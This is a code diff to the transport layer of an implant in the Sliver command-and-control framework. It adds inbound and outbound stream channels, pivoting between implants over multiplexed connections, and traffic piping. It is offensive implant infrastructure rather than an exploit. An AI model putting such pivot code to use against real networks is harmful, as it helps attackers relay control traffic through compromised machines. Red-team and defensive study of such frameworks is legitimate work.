@@ -41,8 +41,7 @@ import (
 // This allows to have different RPC-able streams for parallel work on an implant.
 // Also, these streams can be used to route any net.Conn traffic.
 type Transport struct {
-	ID  uint64   // A unique ID for this transport.
-	URL *url.URL // URL is used by Sliver's code for CC servers.
+	ID uint64 // A unique ID for this transport.
 
 	// Depending on the underlying protocol stack used by this transport,
 	// we might or might not be able to do stream multiplexing. Generally,
@@ -64,17 +63,22 @@ type Transport struct {
 	// transport being in the implant and the server being the one "ordering"
 	// to mux conns, we are in a server position here.
 	multiplexer *yamux.Session
-	closeMux    chan struct{} // Gracefully stop the mux handler
 
 	// C2 - The logical stream used, by default, to speak RPC with the server.
-	// When set up, it makes use of a logical stream muxed from the conn above.
+	// Either setup on top of physical conn, or of a muxed stream. This can
+	// be nil when the transport is connected to another implant (here, we are a pivot.)
 	C2 *Connection
 
-	// streams - Newly muxed streams that are accessible to users of this transport.
-	// The channel is blocking on purpose, as each connection should be processed before
-	// any other is created and used. This channel should be mostly watched by the routing
-	// system, which handles all routed traffic in the background.
-	Streams chan net.Conn
+	// URL is used by Sliver's code for CC servers.
+	URL *url.URL
+
+	// Inbound - Streams that have been created upon request of the
+	// Transport's other end: the C2 Server, an implant pivot, or reverse traffic.
+	// This channel is CONSUMED by the implant's routing system.
+	Inbound chan net.Conn
+	// Outbound - Streams directed at the Transport's other end. This
+	// channel is FILLED by the implant's routing system.
+	Outbound chan net.Conn
 }
 
 // New - Eventually, we should have all supported transport transports being
@@ -171,16 +175,21 @@ func (t *Transport) Start() (err error) {
 	// If not, all C2 RPC layer is already set for this transport.
 	// {{if .Config.RouteEnabled}}
 	if t.IsMux {
+		// Inbound/outbound streams are initialized
+		t.Inbound = make(chan net.Conn, 100)
+		t.Outbound = make(chan net.Conn, 100)
+
 		t.multiplexer, err = yamux.Server(t.conn, nil)
 		if err != nil {
 			// {{if .Config.Debug}}
-			log.Printf("[mux] Error setting up multiplexer: %s", err)
+			log.Printf("[mux] Error setting up multiplexer server: %s", err)
 			// {{end}}
 			return t.phyConnFallBack()
 		}
 
-		// We start handling mux requests in the background.
-		go t.handleMuxRequests()
+		// We start handling inbound/outbound streams in the background.
+		go t.handleInboundStreams()
+		go t.handleOutboundStreams()
 
 		// Add the C2 RPC layer on top of the first muxed stream of the comm.
 		t.C2, err = t.NewStreamC2()
@@ -203,6 +212,49 @@ func (t *Transport) Start() (err error) {
 	return
 }
 
+// StartFromConn - A net.Conn has been created out of a listener, and we
+// setup multiplexing infrastructure around it, without any RPC layer added.
+func (t *Transport) StartFromConn(conn net.Conn) (err error) {
+
+	// We fill details on this Transport
+	// {{if .Config.Debug}}
+	log.Printf("New transport from incoming connection (<- %s)", conn.RemoteAddr())
+	// {{end}}
+
+	// Inbound/outbound streams are initialized
+	t.Inbound = make(chan net.Conn, 100)
+	t.Outbound = make(chan net.Conn, 100)
+
+	t.multiplexer, err = yamux.Client(conn, nil)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error setting up multiplexer client: %s", err)
+		// {{end}}
+	}
+
+	// Initiate first stream, used by remote end as C2 RPC stream.
+	// Then add it to inbound streams, which will be routed. Exceptionally,
+	// the transport is a client, relatively to another implant.
+	stream, err := t.multiplexer.Open()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error opening C2 stream: %s", err)
+		// {{end}}
+		return
+	}
+	t.Inbound <- stream // The stream will be routed back to server.
+	// {{if .Config.Debug}}
+	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.conn.LocalAddr(), t.conn.RemoteAddr())
+	// {{end}}
+
+	// Finally we handle all inbound/outbound streams in background
+	go t.handleInboundStreams()
+	go t.handleOutboundStreams()
+
+	return
+
+}
+
 // NewStreamC2 - The transports muxes the physical connection, adds a C2 RPC layer onto it,
 // starts all request handling goroutines, and returns this connection, if needed.
 // This function is used if we want to use this implant's RPC functionality concurrently.
@@ -214,7 +266,7 @@ func (t *Transport) NewStreamC2() (c2 *Connection, err error) {
 
 	// We wait for the first stream being instantiated over the conn, otherwise we timeout
 	select {
-	case stream := <-t.Streams:
+	case stream := <-t.Inbound:
 		// Get net.Conn stream. This stream is not tracked by any mean latter on. For now only...
 		c2 = &Connection{
 			Send:    make(chan *pb.Envelope),
@@ -308,18 +360,20 @@ func (t *Transport) Stop(force bool) (err error) {
 	return
 }
 
-// handleMuxRequests - A goroutine used to mux the connection in the background,
+// handleInboundStreams - A goroutine used to mux the connection in the background,
 // each time the client (Sliver C2 server) asks for a new separate stream.
-func (t *Transport) handleMuxRequests() {
+// These streams will be handled by the implant routing system.
+func (t *Transport) handleInboundStreams() {
+
 	defer func() {
-		close(t.Streams)
+		close(t.Inbound)
 		// {{if .Config.Debug}}
-		log.Printf("[mux] Stopped listening for mux requests: ")
+		log.Printf("[mux] Stopped processing inbound streams: ")
 		// {{end}}
 	}()
 
 	// {{if .Config.Debug}}
-	log.Printf("[mux] Starting mux request handling in background...")
+	log.Printf("[mux] Starting inbound stream handling in background...")
 	// {{end}}
 	for {
 		select {
@@ -327,14 +381,54 @@ func (t *Transport) handleMuxRequests() {
 			stream, err := t.multiplexer.Accept()
 			if err != nil {
 				// {{if .Config.Debug}}
-				log.Printf("[mux] Error opening C2 stream: %s", err)
+				log.Printf("[mux] Error accepting C2 stream: %s", err)
 				// {{end}}
 				return
 			}
 			// {{if .Config.Debug}}
-			log.Printf("[mux] Muxing conn")
+			log.Printf("[mux] Inbound stream: muxing conn")
 			// {{end}}
-			t.Streams <- stream
+			t.Inbound <- stream
+
+		case <-t.multiplexer.CloseChan():
+			return
+		}
+	}
+}
+
+// handleOutboundStreams - The routing system populates the Outbound
+// stream channel with connections that we need to route to this
+// Transport's other end. We process/pipe these connections here.
+func (t *Transport) handleOutboundStreams() {
+
+	defer func() {
+		close(t.Outbound)
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Stopped processing outbound streams: ")
+		// {{end}}
+	}()
+
+	// {{if .Config.Debug}}
+	log.Printf("[mux] Starting outbound stream handling in background...")
+	// {{end}}
+
+	for {
+		select {
+		case src := <-t.Outbound:
+			dst, err := t.multiplexer.Open()
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("[mux] Error opening C2 stream: %s", err)
+				// {{end}}
+				return
+			}
+			// We pipe the output in the background, and go on with the next stream.
+			go transport(src, dst)
+
+			// {{if .Config.Debug}}
+			log.Printf("[mux] Outbound stream: muxing conn and piping")
+			// {{end}}
+
 		case <-t.multiplexer.CloseChan():
 			return
 		}
@@ -353,6 +447,23 @@ func (t *Transport) phyConnFallBack() (err error) {
 	// Wrap RPC layer around physical conn here.
 
 	return
+}
+
+func transport(rw1, rw2 io.ReadWriter) error {
+	errc := make(chan error, 1)
+	go func() {
+		errc <- copyBuffer(rw1, rw2)
+	}()
+
+	go func() {
+		errc <- copyBuffer(rw2, rw1)
+	}()
+
+	err := <-errc
+	if err != nil && err == io.EOF {
+		err = nil
+	}
+	return err
 }
 
 func newID() uint64 {
